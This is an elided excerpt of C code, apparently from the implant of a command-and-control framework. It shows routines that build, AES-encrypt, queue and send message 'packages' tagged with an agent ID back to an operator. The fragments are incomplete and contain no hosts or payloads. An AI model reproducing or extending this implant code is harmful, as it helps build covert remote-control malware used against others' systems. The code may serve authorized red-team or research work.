...
VOID PackageAddInt32(
    ...
    Package->Buffer = ((INSTANCE *)Instance)->Win32.LocalReAlloc(
            Package->Buffer,
...
PPACKAGE PackageCreate( UINT32 CommandID )
{
    ...
    Package            = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->RequestID = ((INSTANCE *)Instance)->CurrentRequestID;
...
PPACKAGE PackageCreateWithMetaData( UINT32 CommandID )
{
    ...
    PackageAddInt32( Package, ((INSTANCE *)Instance)->Session.AgentID );
...
VOID PackageDestroy(
    ...
    PPACKAGE Pkg = ((INSTANCE *)Instance)->Packages;

    if ( Package )
    {
        // make sure the package is not on the ((INSTANCE *)Instance)->Packages list, avoid UAF
        while ( Pkg )
        {
            if ( Package == Pkg )
            {
                PUTS_DONT_SEND( "Package can't be destroyed, is on ((INSTANCE *)Instance)->Packages list" )
                return;
            }
        ...
        if ( Package->Buffer )
        {
            ...
            ((INSTANCE *)Instance)->Win32.LocalFree( Package->Buffer );
            Package->Buffer = NULL;
        }

        MemSet( Package, 0, sizeof( PACKAGE ) );
        ((INSTANCE *)Instance)->Win32.LocalFree( Package );
        Package = NULL;
    }
}
...
BOOL PackageTransmitNow(
    ...
    if ( Package )
    {
        ...
        if ( Package->Encrypt )
        {
            ...
            AesInit( &AesCtx, ((INSTANCE *)Instance)->Config.AES.Key, ((INSTANCE *)Instance)->Config.AES.IV );
...
VOID PackageTransmit(
    ...
    if ( ! ((INSTANCE *)Instance)->Packages )
    {
        ((INSTANCE *)Instance)->Packages = Package;
    }
    else
    {
        // add the new package to the end of the list (to preserve the order)
        List = ((INSTANCE *)Instance)->Packages;
        while ( List->Next ) {
            List = List->Next;
        }
        List->Next = Package;
...
BOOL PackageTransmitAll(
    ...
    */
    ...
    Entry = ((INSTANCE *)Instance)->Packages;
    Prev  = NULL;
    ...
    if ( Success )
    {
        ...
        while ( Entry )
        {
            if ( Entry->Included )
            {
                ...
                if ( Entry == ((INSTANCE *)Instance)->Packages )
                {
                    // update the start of the list
                    ((INSTANCE *)Instance)->Packages = Entry->Next;
